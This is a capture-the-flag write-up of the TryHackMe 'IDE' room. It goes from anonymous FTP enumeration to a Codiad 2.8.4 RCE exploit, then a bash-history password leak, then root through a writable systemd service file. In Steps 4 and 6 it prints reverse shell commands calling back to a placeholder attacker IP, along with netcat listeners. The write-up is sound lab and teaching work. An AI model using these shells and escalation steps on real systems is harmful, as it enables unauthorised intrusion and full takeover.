# IDE — TryHackMe Writeup

**Difficulty:** Easy  
**Category:** Linux, Enumeration, Privilege Escalation  
**Room Link:** [TryHackMe - IDE](https://tryhackme.com/room/ide)  
**Date Completed:** 28-04-2026  

---

## Overview

IDE is a boot2root Linux machine where the goal is to gain a shell and escalate to root. The name is a clue — there's a web-based IDE running on the box that becomes your way in. The attack chain goes: anonymous FTP -> hidden note -> login to the IDE -> RCE -> pivot to user -> abuse a misconfigured service to get root.

Pretty satisfying chain once it all clicks.

---

## Tools Used

| Tool | Purpose |
|------|---------|
| `nmap` | Port scanning and service detection |
| `ftp` | Enumerating the anonymous FTP server |
| `searchsploit` | Finding a known exploit for Codiad |
| `nc (netcat)` | Setting up reverse shell listeners |
| `linpeas` | Automated privilege escalation enumeration |

---

## Step 1 — Port Scanning

First thing: figure out what's running on the box. I used nmap with service detection.

```bash
nmap -sC -sV <TARGET_IP>
```
![alt text](<Screenshot 2026-04-28 232527.png>)

The scan revealed four open ports:

- **Port 21 — FTP (vsftpd 3.0.3)** — anonymous login allowed
- **Port 22 — SSH (OpenSSH 7.6p1)**
- **Port 80 — HTTP (Apache 2.4.29)** — default Apache page, nothing interesting
- **Port 62337 — HTTP (Apache 2.4.29)** — this one had something running on it

Port 62337 was the interesting one. Nmap showed the title as "Codiad 2.8.4" — a web-based cloud IDE. That explains the room name.

But before going to the web server, the anonymous FTP stood out immediately. Anonymous FTP means anyone can log in without a real password. That's almost always where you start.

---

## Step 2 — Enumerating FTP

Connected to the FTP server using anonymous as the username and just pressing enter for the password.

```bash
ftp <TARGET_IP>
```

```
Name: anonymous
Password: [press enter]
230 Login successful.
```

![alt text](<Screenshot 2026-04-28 233011.png>)

Running a regular `ls` showed an empty directory — nothing there. But running `ls -la` revealed a hidden directory called `...` (three dots). Easy to miss if you're not looking carefully. This is a common trick in CTFs.

```bash
ftp> ls -la
```

Inside the `...` directory was a file simply named `-`. Downloading a file called `-` is a bit awkward because ftp interprets it as stdin, so you have to be specific:

```bash
ftp> cd ...
ftp> get - output.txt
```

The file contained a note:

```
Hey john,
I have reset the password as you have asked. Please use the default password to login.
Also, please take care of the image file ;)
- drac.
```

Two usernames: **john** and **drac**. And a hint that john's password was reset to the "default password." That's all we needed from FTP.

---

## Step 3 — Web Enumeration

Port 80 had the default Apache Ubuntu page — nothing useful there.

Port 62337 had **Codiad 2.8.4** — a web-based IDE. There was a login page waiting for credentials.

The note said "default password" for john. In CTF terms, that usually means something very obvious. Trying `john` with the most common default password got us in.

Once logged in, the next step was looking for known exploits for Codiad 2.8.4.

```bash
searchsploit codiad 2.8.4
```

There were multiple authenticated RCE exploits available. Since we had valid credentials, we could use them.

---

## Step 4 — Getting a Shell (RCE via Codiad)

Used the Codiad 2.8.4 RCE exploit. The exploit works by injecting a reverse shell through the IDE's file management functionality.

You need two terminal windows open: one to run the exploit, and one to catch the incoming connection.

Terminal 1 — listener for the exploit's intermediate connection:
```bash
echo 'bash -c "bash -i >/dev/tcp/YOUR_IP/4445 0>&1 2>&1"' | nc -lnvp 4444
```

Terminal 2 — listener for the actual shell:
```bash
nc -lnvp 4445
```

Then run the exploit:
```bash
python3 49705.py http://<TARGET_IP>:62337/ john <PASSWORD> <YOUR_IP> 4444 linux
```

Once it connected back, we had a shell as `www-data`. Not ideal but it's a start.

```
www-data@ide:/var/www/html/codiad/components/filemanager$
```

We couldn't read `user.txt` because it was in drac's home directory and locked to that user only:

```
-r-------- 1 drac drac 33 Jun 18  2021 user.txt
```

Time to find a way to become drac.

---

## Step 5 — Lateral Movement to drac

Ran linpeas for automated enumeration. It found something immediately in the bash history:

```bash
cat /home/drac/.bash_history
```

```
mysql -u drac -p 'THEDRACPASSWORD'
```

Someone had typed their password directly into the terminal. That password was sitting right there in the history file. You'd think people would know better, but here we are.

Used those credentials to SSH in as drac directly:

```bash
ssh drac@<TARGET_IP>
```

Grabbed `user.txt` from `/home/drac/user.txt`.

---

## Step 6 — Privilege Escalation to Root

Checked what drac could run as sudo:

```bash
sudo -l
```

```
User drac may run the following commands on ide:
    (ALL : ALL) /usr/sbin/service vsftpd restart
```

Drac could restart the vsftpd service as root. That sounds harmless until you check who owns the service file.

```bash
ls -l /lib/systemd/system/vsftpd.service
```

```
-rw-rw-r-- 1 root drac 248 Aug 4 2021 vsftpd.service
```

Drac had write permissions on the service file. This means we can modify what command runs when the service starts, then trigger a restart as root — which runs our command as root.

Edited the `ExecStart` line in `/lib/systemd/system/vsftpd.service`:

```
ExecStart=/bin/bash -c "bash -i >& /dev/tcp/YOUR_IP/443 0>&1 ; /usr/sbin/vsftpd /etc/vsftpd.conf"
```

Reloaded the systemd daemon so it picked up the change:

```bash
systemctl daemon-reload
```

Set up a listener:

```bash
nc -lnvp 443
```

Then triggered the restart:

```bash
sudo /usr/sbin/service vsftpd restart
```

![alt text](<Screenshot 2026-04-28 233125.png>)

The shell came back as root.

```
root@ide:/# id
uid=0(root) gid=0(root) groups=0(root)
```

Grabbed `root.txt` from `/root/root.txt` and that was the box done.

---

## Flags

| Flag | Location |
|------|---------|
| user.txt | `/home/drac/user.txt` |
| root.txt | `/root/root.txt` |

---

## What I Learned

Anonymous FTP is a real attack surface. I had read about it before but actually using it to find a credential hint made it stick. The hidden `...` directory was a nice trick too — always run `ls -la`, not just `ls`.

Bash history is a goldmine. One of the first things to check after getting a shell. People type passwords into terminals all the time and forget that it gets logged.

Writable service files are dangerous. If you can write to a systemd service file and someone can restart that service as root, you effectively have root. The lesson from the defensive side: lock down service file permissions properly.

The exploit chain here required patience. Each step depended on the previous one working correctly and it wasn't immediately obvious how everything connected. That's what makes boot2root rooms good practice.

---

## Resources

- [Codiad 2.8.4 RCE - ExploitDB](https://www.exploit-db.com/exploits/49705)
- [Linux Privilege Escalation - HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
- [Systemd Service File Reference](https://www.shellhacks.com/systemd-service-file-example/)

---

*Written by [fiza.sk293](https://tryhackme.com/p/fiza.sk293)*
